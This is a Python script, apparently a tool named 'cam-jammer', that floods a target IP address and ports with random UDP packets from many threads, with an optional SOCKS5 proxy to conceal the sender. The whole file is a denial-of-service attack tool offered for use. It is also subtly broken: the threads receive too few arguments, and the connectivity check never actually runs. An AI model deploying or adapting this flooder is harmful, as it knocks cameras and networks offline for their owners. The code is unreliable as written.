import socket
import socks
import random
import string
import threading
import argparse

def internet_connection():
    try:
        socket.gethostbyname("www.google.com")
        return True
    except socket.gaierror:
        return False


def home_logo():
    print("""
        ####   ##     ##      ###        #####      #######     #######
         ##    ##     ##     ## ##      ##   ##    ##     ##   ##     ##
         ##    ##     ##    ##   ##    ##     ##   ##     ##   ##     ##
         ##    #########   ##     ##   ##     ##    #######     ########
         ##    ##     ##   #########   ##     ##   ##     ##          ##
         ##    ##     ##   ##     ##    ##   ##    ##     ##   ##     ##
        ####   ##     ##   ##     ##     #####      #######     #######

IHA089: Navigating the Digital Realm with Code and Security - Where Programming Insights Meet Cyber Vigilance.
    """)

def send_random_udp_packets(target_ip, target_port, proxy_ip, proxy_port):
    while True:
        try:
            sock = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
            if proxy_ip and proxy_port:
                sock.set_proxy(socks.SOCKS5, proxy_ip, proxy_port)
                
            random_data = bytes(random.getrandbits(8) for _ in range(1024))
            sock.sendto(random_data, (target_ip, target_port))
            print(f"Sent random UDP packet: {random_data[:20]}...")  
        except Exception as e:
            print(f"An error occurred: {e}")

def multiple_threads(ports, totel_thread, ip, proxy_ip, proxy_port):
    threads=[]
    for port in ports:
        for i in range(totel_thread):
           port = int(port)
           thread = threading.Thread(target=send_random_udp_packets, args=(ip, port))
           threads.append(thread)
           thread.start()
    
    for thread in threads:
        thread.join()

            
def Main():
    parser = argparse.ArgumentParser(description='cam-jammer')
    parser.add_argument('-ip', '--ip', type=str, help='target ip address')
    parser.add_argument('-port', '--port', type=str, help='target port numbers(choose multiple port seperated by comma(,))')
    parser.add_argument('-thread', '--num_thread', type=int, help='Number of threads for each port', default=5)
    parser.add_argument('-proxy_ip', '--proxy_ip', type=str, help='set proxy IP')
    parser.add_argument('-proxy_port', '--proxy_port', type=int, help='set proxy PORT')

    if internet_connection:
        args = parser.parse_args()
        ip = args.ip
        port = args.port
        num_thread = args.num_thread
        proxy_ip = args.proxy_ip
        proxy_port = args.proxy_port

        if ip and port:
            home_logo()
            ports = port.split(",")
            multiple_threads(ports, num_thread, ip, proxy_ip, proxy_port)
    else:
        print("No internet connection")


if __name__ == "__main__":
    Main()
